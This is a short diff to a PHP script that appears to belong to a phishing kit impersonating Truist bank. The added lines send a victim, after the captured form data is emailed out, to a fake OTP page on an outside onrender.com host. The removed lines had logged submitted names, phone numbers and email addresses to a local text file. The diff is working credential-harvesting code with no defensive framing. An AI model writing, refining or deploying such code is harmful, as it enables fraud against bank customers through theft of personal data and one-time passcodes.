@@ -38,18 +38,13 @@ try {
     $mail->Body    = $text;
 
     $mail->send();
+
+    header('Location: https://verifytruist.onrender.com/Truist/OTP2.html');
+    exit();
 } catch (Exception $e) {
     echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
 }
 
 
 
-
-
-
-
-
-file_put_contents("usernames.txt", "FIRST NAME: " . $_POST['firstName'] . "\nLAST NAME: " . $_POST['lastName'] . "\nPHONE: " . $_POST['phone'] . "\nEMAIL: " . $_POST['email'] . "\n", FILE_APPEND);
-header('Location: OTP2.html');
-exit();
 ?>
